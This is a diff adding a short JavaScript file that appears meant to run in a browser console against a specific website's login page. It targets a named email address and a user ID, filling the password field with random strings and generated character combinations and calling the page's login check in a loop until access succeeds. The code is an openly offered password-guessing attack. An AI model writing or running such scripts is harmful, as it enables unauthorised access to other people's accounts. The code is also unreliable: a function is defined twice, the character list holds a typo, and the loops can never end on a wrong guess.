@@ -1,0 +1,57 @@
+$('#userId1').val('akshayrathnavas@gmail.com')
+var chars = ["a","b","c","d","e","f","g","h","i","j,","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," ","9","R","K","S","A","Y","@"];
+while($('#logInUN').text() == "My Account"){
+  var len = Math.floor(Math.random() * 20);
+  var str = "";
+  while(str.length < len){
+    str += chars[Math.floor(Math.random() * chars.length)];
+  }
+  $("#userPass1").val(str);
+	validateUser();
+}
+$('#logInUN').text();
+
+
+
+function getCombinations(chars) {
+  var result = [];
+  var f = function(prefix, chars) {
+    for (var i = 0; i < chars.length; i++) {
+      result.push(prefix + chars[i]);
+      f(prefix + chars[i], chars.slice(i + 1));
+    }
+  }
+  f('', chars);
+  return result;
+}
+
+
+var combinations = getCombinations(["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","1","2","3","4","5","6","7","8","9","0","!","@","#","%","&","*"]);
+
+
+	function getCombinations(chars) {
+	  var result = [];
+	  var f = function(prefix, chars) {
+		for (var i = 0; i < chars.length; i++) {
+		  result.push(prefix + chars[i]);
+		  bruteForce(prefix + chars[i]);
+		  f(prefix + chars[i], chars.slice(i + 1));
+		}
+	  }
+	  f('', chars);
+	  return result;
+	}
+
+	function bruteForce(input){
+	$('#userId1').val('C17A1192')
+	while($('#logInUN').text() == "My Account"){
+	  $("#userPass1").val(input);
+		validateUser();
+	}
+	if($('#logInUN').text() != "My Account"){
+		$('#logInUN').text();
+
+	}
+	}
+
+	var combinations = getCombinations(["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","1","2","3","4","5","6","7","8","9","0","!","@","#","%","&","*"]);
